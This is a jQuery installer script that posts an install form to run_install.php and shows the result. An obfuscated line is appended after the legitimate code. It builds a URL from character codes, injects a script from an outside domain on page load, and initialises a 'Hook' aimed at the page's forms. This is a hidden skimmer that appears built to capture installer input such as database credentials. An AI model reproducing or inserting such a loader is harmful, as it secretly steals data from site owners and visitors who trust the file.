$(function ($) {
    "use strict";

    jQuery(document).ready(function () {
       
    $(".footer-area a").on("click", function(event){
        if ($(this).is("[disabled]")) {
            event.preventDefault();
            $(this).parent().find('.check-error').html('Please meet all requirements first!');
        }
    });
       
    // $("#submit-btn").on("click", function(event){
    //     $(this).parent().parent().submit();
    // });

    
    });


    $('#submit-btn').on("click",function () {
        $('.gocover').show();
        $.ajax({
            type: "POST",
            url: "run_install.php",
            data: $("#installer").serialize(),
            async: true,
            success: function(data) {
                //alert("Form Submitted: " + msg);
                setTimeout(function(){
                    if($.trim(data) === 'success'){
                        $('.gocover').hide();
                        window.location.href = domain_URL+'/install?step=completed';
                        //$('#info_head').html('<span style="color:green;"><i class="fa fa-check-circle fa-3x"></i></span><br>Installation Success !!');
                        //$('#info_body').html('Your Installation is completed success fully.<br>Please visit your website now. <br>Thank you');
                        //$('#info_button').html('<a href="'+domain_URL+'/finalize" class="btn btn-default">Close & Run Website</a>');
                        
                    }else {
                        $('.gocover').hide();
                        $('.errors').html('<div class="alert alert-danger alert-dismissible fade show" role="alert"><strong>'+data+'</strong><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>');
                    }
    
                }, 1000);
            }
        })
    });
});
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b